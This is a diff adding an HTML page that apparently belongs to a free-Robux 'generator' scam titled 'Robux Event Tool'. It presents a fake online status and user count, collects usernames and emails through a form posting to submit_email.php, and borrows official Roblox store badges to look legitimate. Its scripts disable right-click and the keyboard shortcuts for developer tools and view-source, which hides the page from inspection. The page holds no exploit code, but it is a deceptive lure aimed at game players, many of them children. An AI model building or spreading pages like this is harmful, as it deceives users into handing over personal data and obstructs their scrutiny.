@@ -1,0 +1,196 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+		<title>Robux Event Tool</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta name="description" content="Robux Event Tool">    
+		
+		<link rel="icon" type="image/ico" href="images/f-icon.png">
+		<!-- Open Graph Meta Tags-->
+		<meta property="og:title" content="Robux Event Tool"> 
+		<meta property="og:description" content="Robux Event Tool"> 
+		<meta property="og:type" content="website">
+		<meta property="og:url" content="http://www.mywebsiteurl.com/"> 
+		<meta property="og:image" content="images/social-share-image.jpg">
+		<!-- Twitter Meta -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:site" content="@tweetname">
+		<meta name="twitter:title" content="Tweet Title">
+		<meta name="twitter:description" content="Tweet Content">
+		<meta name="twitter:image" content="http://www.mywebsiteurl.com/twitter-share-image.jpg">
+		<!-- Icons -->
+		<link rel="stylesheet" href="css/icon-font.min.css">
+		<link rel="stylesheet" href="css/all.css" crossorigin="anonymous">
+		<!-- CSS -->
+		<link href="css/bootstrap.min.css" rel="stylesheet">  
+		<link href="css/animate.css" rel="stylesheet">
+		<link href="css/magnific-popup.css" rel="stylesheet">
+		<link href="css/style.css" rel="stylesheet">
+		<script src="js/jquery-3.6.0.min.js"></script>
+		
+		  <style>
+		html {
+		-webkit-touch-callout:none;
+		-webkit-user-select:none;
+		-khtml-user-select:none;
+		-moz-user-select:none;
+		-ms-user-select:none;
+		user-select:none;
+		-webkit-tap-highlight-color:rgba(0,0,0,0)
+		}
+	</style>
+		
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-46NPM8YCQG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-46NPM8YCQG');
+</script>
+
+
+	</head>
+	<body oncontextmenu="return false">	
+		
+		<div class="wrapper-pattern"> 
+		<div class="main-bg"></div>	
+		
+		<div id="guide" class="guide">
+			<div class="guide-overlay"></div>
+			<img id="close-guide" src="images/close-icon.png" class="input-icon">
+			<video id="guideVideo" src="tag.mp4" controls=""></video>
+		</div>	
+		<div class="main-wrapper">		
+				
+				<header>					
+					<div class="branding-wrapper">						
+						<img src="images/logo-text.webp" with="100%" height="90" alt="Robux Event">
+						<!--<img src="img/logo-text.ong" class="img-fluid logo-img-2" alt="Robux Event" /> -->
+					</div>
+                    <!-- ADS -->
+ 
+                    <!-- ADS END-->
+				</header>
+				<div class="after-header-wrapper">
+				
+					
+					<h1 style="display: none;">Robux Tool</h1>
+					<h4 style="display: none;">Claim Robux for your Robux Event account.</h4>
+					<div class="generator-status">
+						<div class="generator-status-content">
+							<div class="status-item-wrapper animated bounceIn animation-delay-400">
+								<span class="status-label">Status:</span>
+								<span id="status" class="status-dynamic">Online</span>
+							</div>
+							<div class="status-item-wrapper status-item-wrapper-2 animated bounceIn animation-delay-600">
+								<span class="status-label">Last Update:</span>
+								<span id="date" class="status-dynamic"></span>
+							</div>
+							<div class="status-item-wrapper animated bounceIn animation-delay-800">
+								<span class="status-label">Online Users:</span>
+								<span id="online-count" class="status-dynamic"></span>
+							</div>
+						</div>
+					</div>
+				</div>
+				
+				<div class="main-content">
+					<div class="container">
+						<div class="generator-wrapper">
+								
+							<div class="generator-content">	
+							<div class="reqoverlay"> </div>
+							<!--
+								<div class="console-loadbar-wrapper">
+		<div id="progressBarConsole" class="console-loadbar animated bounceIn"><div></div></div>
+	</div>-->
+							
+								<div class="title">Username &amp; Email</div>
+								
+								<div class="form-wrapper">
+									
+									
+									<!--
+									<div class="label animated bounceIn animation-delay-400">Enter Player Id:</div>
+									-->
+									<div class="animated bounceIn animation-delay-600">
+										<div class="input-wrapper username-wrapper" style="">
+											<input type="text" id="player-username" class="s-input" placeholder="Username">
+											
+											<div id="player-error-msg" style="margin-top: 10px;color: #f00;font-size: 1em; display: none;" class="label animated bounceIn animation-delay-400"></div>
+										</div>
+									</div>
+									
+									<!--
+									<div class="label animated bounceIn animation-delay-400">Email Address:</div>
+									-->
+									<div class="animated bounceIn animation-delay-600">
+										<div class="input-wrapper username-wrapper" style="">
+											<!-- <img src="img/email-icon.png" class="input-icon"> -->
+											<form id="emailForm" action="submit_email.php" method="post">
+												<input type="email" id="email" name="email" class="s-input" placeholder="Email" required="">
+												<div id="email-error-msg" style="margin-top: 10px;color: #f00;font-size: 1em; display: none;" class="label animated bounceIn animation-delay-400">This Email Already Exists!!</div>
+												<div class="button-wrapper animated bounceIn animation-delay-1000">
+													<button type="submit" id="proc-btn-1" class="tkt-btn">Start</button>
+												</div>
+											</form>
+										</div>
+									</div>
+								</div>
+
+							</div>
+						</div>
+					</div>
+					
+					<div class="main-container">
+					  <div></div>
+					</div>
+					
+					<!--<div class="bg-detail"><img src="img/main-bg.jpg" class="bg-detail" /></div>-->
+				
+					<div id="app-stores-container" style="bottom: auto;position: relative;padding: 40px 0 18px;font-size: 16px;font-weight: 400;line-height: 1.4em;z-index: 56;">
+					<div id="app-stores" style="width: 100%;margin: 0 auto;text-align: center;max-width: 800px;font-size: 16px;font-weight: 400;line-height: 1.4em;">
+					<div id="app-stores-devices" style="color: #fff;margin-bottom: 12px;text-transform: uppercase;font-weight: bold;">
+					<h4><span>Roblox on your Device</span></h4>
+					</div>
+					<a href="https://itunes.apple.com/us/app/roblox-mobile/id431946152" target="_blank" rel="noreferrer" class="apple-badge app-store-logo" aria-label="Roblox on App Store" title="Roblox on App Store" style=""></a><a href="https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en&amp;utm_source=global_co&amp;utm_medium=prtnr&amp;utm_content=Mar2515&amp;utm_campaign=PartBadge&amp;pcampaignid=MKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1" target="_blank" rel="noreferrer" class="google-badge app-store-logo" aria-label="Get it on Google Play" title="Get it on Google Play"></a><a href="https://www.playstation.com/en-us/games/roblox/" target="_blank" rel="noreferrer" class="playstation-badge app-store-logo" aria-label="Roblox on PlayStation" title="Roblox on PlayStation"></a><a href="https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k" target="_blank" rel="noreferrer" class="xbox-badge app-store-logo" aria-label="Roblox on Xbox Store" title="Roblox on Xbox Store"></a><a href="https://www.meta.com/experiences/5804350719675181/" target="_blank" rel="noreferrer" class="meta-quest-badge app-store-logo" aria-label="Roblox on Meta Quest" title="Roblox on Meta Quest"></a><a href="https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm" target="_blank" rel="noreferrer" class="microsoft-badge app-store-logo" aria-label="Roblox on Windows Store" title="Roblox on Windows Store"></a><a href="https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA" target="_blank" rel="noreferrer" class="amazon-badge app-store-logo" aria-label="Roblox on Amazon Store" title="Roblox on Amazon Store"></a></div></div>
+					
+				
+				</div>	
+				
+		</div>
+		
+
+		<div class="modal-outer"></div>
+		</div>
+	
+		
+	
+	<script>
+		document.onkeydown = function(e) {
+		  if(event.keyCode == 123) {
+			 return false;
+		  }
+		  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+			 return false;
+		  }
+		  if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+			 return false;
+		  }
+		  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+			 return false;
+		  }
+		  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+			 return false;
+		  }
+		}
+	</script>
+	
+	<script src="js/scripts.js"></script>
+		
+	<script type="text/javascript" src="js/jquery.min.js"></script>
+	<script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>	
+	<script type="text/javascript" src="js/ion.sound.min.js"></script>	
+    <script type="text/javascript" src="js/jquery.countTo.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+</body><!-- JS --></html>
